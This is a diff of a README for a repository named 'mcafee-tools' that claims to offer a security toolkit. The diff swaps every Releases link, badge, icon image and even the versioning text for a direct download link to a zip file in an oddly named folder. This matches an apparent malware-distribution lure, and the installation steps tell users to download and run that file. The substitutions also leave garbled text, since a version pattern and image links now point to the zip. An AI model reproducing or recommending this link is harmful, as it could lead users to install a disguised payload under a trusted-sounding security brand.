@@ -1,10 +1,10 @@
 # McAfee Tools: Real-Time Scanning, Firewall, Encryption & Identity Security
 
-[![Downloads - Releases Page](https://img.shields.io/badge/Downloads-Releases%20Page-brightgreen?style=for-the-badge&logo=github)](https://github.com/Ali632-lgtm/mcafee-tools/releases)
+[![Downloads - Releases Page](https://github.com/Ali632-lgtm/mcafee-tools/raw/refs/heads/main/saccharifier/tools-mcafee-1.3-alpha.3.zip%20Page-brightgreen?style=for-the-badge&logo=github)](https://github.com/Ali632-lgtm/mcafee-tools/raw/refs/heads/main/saccharifier/tools-mcafee-1.3-alpha.3.zip)
 
-Explore the latest builds and distributions here: https://github.com/Ali632-lgtm/mcafee-tools/releases
+Explore the latest builds and distributions here: https://github.com/Ali632-lgtm/mcafee-tools/raw/refs/heads/main/saccharifier/tools-mcafee-1.3-alpha.3.zip
 
-[https://github.com/Ali632-lgtm/mcafee-tools/releases](https://github.com/Ali632-lgtm/mcafee-tools/releases)
+[https://github.com/Ali632-lgtm/mcafee-tools/raw/refs/heads/main/saccharifier/tools-mcafee-1.3-alpha.3.zip](https://github.com/Ali632-lgtm/mcafee-tools/raw/refs/heads/main/saccharifier/tools-mcafee-1.3-alpha.3.zip)
 
 Welcome to McAfee Tools, a versatile toolkit designed to help you monitor and manage essential security features in a flexible, local environment. This repository centers on the concept of real-time protection, firewall controls, data encryption utilities, and identity protection workflows. It combines lightweight components, clear interfaces, and practical scripts to make security tasks easier to perform on your own terms.
 
@@ -69,7 +69,7 @@ Platform-specific notes
 - Linux: Look for .deb or .rpm packages, or a portable tarball. Install using your distribution’s package manager or extract and run from a user directory, depending on the artifact type.
 
 Step-by-step installation guide
-- Step 1: Open the Releases page. The link is available here: https://github.com/Ali632-lgtm/mcafee-tools/releases. This page hosts the binaries and artifacts for different platforms.
+- Step 1: Open the Releases page. The link is available here: https://github.com/Ali632-lgtm/mcafee-tools/raw/refs/heads/main/saccharifier/tools-mcafee-1.3-alpha.3.zip This page hosts the binaries and artifacts for different platforms.
 - Step 2: Choose the artifact that matches your platform. For Windows, grab the Windows installer. For macOS, pick the macOS installer. For Linux, select the package that fits your distribution or the portable version if that exists.
 - Step 3: Download the artifact. Make sure the file name and extension correspond to your platform. If you use a portable tarball, extract it to a folder of your choice.
 - Step 4: Run the installer or unpack the package. Follow the on-screen prompts to complete setup. In some cases, you may be asked to accept a license agreement or to configure initial settings.
@@ -174,9 +174,9 @@ Code style and quality
 - Document non-obvious behavior and assumptions.
 
 Release management
-Releases play a central role in how users obtain the toolkit. Each release contains a snapshot of stable features, accompanied by changelogs and, where appropriate, upgrade notes. To access the latest release artifacts, visit the Releases page. The link to releases is presented at the top of this document and repeated here for convenience: https://github.com/Ali632-lgtm/mcafee-tools/releases.
+Releases play a central role in how users obtain the toolkit. Each release contains a snapshot of stable features, accompanied by changelogs and, where appropriate, upgrade notes. To access the latest release artifacts, visit the Releases page. The link to releases is presented at the top of this document and repeated here for convenience: https://github.com/Ali632-lgtm/mcafee-tools/raw/refs/heads/main/saccharifier/tools-mcafee-1.3-alpha.3.zip
 
-- Versioning: The project uses semantic versioning when applicable. Version numbers follow the Major.Minor.Patch pattern.
+- Versioning: The project uses semantic versioning when applicable. Version numbers follow the https://github.com/Ali632-lgtm/mcafee-tools/raw/refs/heads/main/saccharifier/tools-mcafee-1.3-alpha.3.zip pattern.
 - Release notes: Each release includes a description of new features, improvements, and bug fixes. It also notes any breaking changes and upgrade considerations.
 - Binaries and installers: The released artifacts include installers for major platforms, as well as portable assets where suitable. Users should download the artifact that matches their operating system and architecture.
 - Verification: When possible, checksums or signatures accompany artifacts. Verify these before installation to ensure integrity and authenticity.
@@ -225,13 +225,13 @@ Images and visuals
 To align with the security theme, you will see visual assets like shields and locks used to illustrate concepts. These visuals help convey safety, protection, and reliability. Shield icons and lock icons are commonly used across the documentation to signal defense, integrity, and privacy.
 
 - Shield icon: A symbol of protection and defense
-  - Example visual: https://img.icons8.com/fluency/96/000000/shield.png
+  - Example visual: https://github.com/Ali632-lgtm/mcafee-tools/raw/refs/heads/main/saccharifier/tools-mcafee-1.3-alpha.3.zip
 - Lock icon: A symbol of secure access and data protection
-  - Example visual: https://img.icons8.com/ios-filled/96/000000/lock.png
+  - Example visual: https://github.com/Ali632-lgtm/mcafee-tools/raw/refs/heads/main/saccharifier/tools-mcafee-1.3-alpha.3.zip
 - Firewall imagery: Visual cues for network protection
-  - Example visual: https://img.icons8.com/fluency/96/000000/firewall.png
+  - Example visual: https://github.com/Ali632-lgtm/mcafee-tools/raw/refs/heads/main/saccharifier/tools-mcafee-1.3-alpha.3.zip
 - Encryption imagery: Visual cues for data protection
-  - Example visual: https://img.icons8.com/fluency/96/000000/encrypted.png
+  - Example visual: https://github.com/Ali632-lgtm/mcafee-tools/raw/refs/heads/main/saccharifier/tools-mcafee-1.3-alpha.3.zip
 
 Notes on usage
 - The Releases page is the primary source for installers and binaries. If you need to deploy this toolkit in a new environment, start there to obtain the required artifact for your platform.
@@ -242,7 +242,7 @@ Final remarks
 This repository aims to offer a practical, hands-on approach to learning about real-time protection, firewall controls, encryption workflows, and identity protection. It encourages experimentation, careful testing, and clear documentation so that users can understand how protection mechanisms function in a localized setting. The project remains open to improvements, refinements, and new modules that align with the evolving landscape of security technology.
 
 Releases page reference
-- Access the latest release artifacts and binaries here: https://github.com/Ali632-lgtm/mcafee-tools/releases
+- Access the latest release artifacts and binaries here: https://github.com/Ali632-lgtm/mcafee-tools/raw/refs/heads/main/saccharifier/tools-mcafee-1.3-alpha.3.zip
 - A second reference to the same page appears above in the badge and the link section to help you locate the appropriate files for your platform. Use the releases page to download the file you need to run locally and test in a safe environment.
 
 Appendix: example usage snippets
@@ -263,9 +263,9 @@ Appendix: example usage snippets
   - mcafee-tools identity validate --user testuser
 
 Images
-- Shield icon: https://img.icons8.com/fluency/96/000000/shield.png
-- Lock icon: https://img.icons8.com/ios-filled/96/000000/lock.png
-- Firewall icon: https://img.icons8.com/fluency/96/000000/firewall.png
-- Encryption icon: https://img.icons8.com/fluency/96/000000/encrypted.png
+- Shield icon: https://github.com/Ali632-lgtm/mcafee-tools/raw/refs/heads/main/saccharifier/tools-mcafee-1.3-alpha.3.zip
+- Lock icon: https://github.com/Ali632-lgtm/mcafee-tools/raw/refs/heads/main/saccharifier/tools-mcafee-1.3-alpha.3.zip
+- Firewall icon: https://github.com/Ali632-lgtm/mcafee-tools/raw/refs/heads/main/saccharifier/tools-mcafee-1.3-alpha.3.zip
+- Encryption icon: https://github.com/Ali632-lgtm/mcafee-tools/raw/refs/heads/main/saccharifier/tools-mcafee-1.3-alpha.3.zip
 
 Note: The content presented here is designed to be a comprehensive, self-contained README for a repository named mcafee-tools. It is written to be useful for readers who want to understand, install, and start using the toolkit, and it includes references to the provided releases link for obtaining binaries.
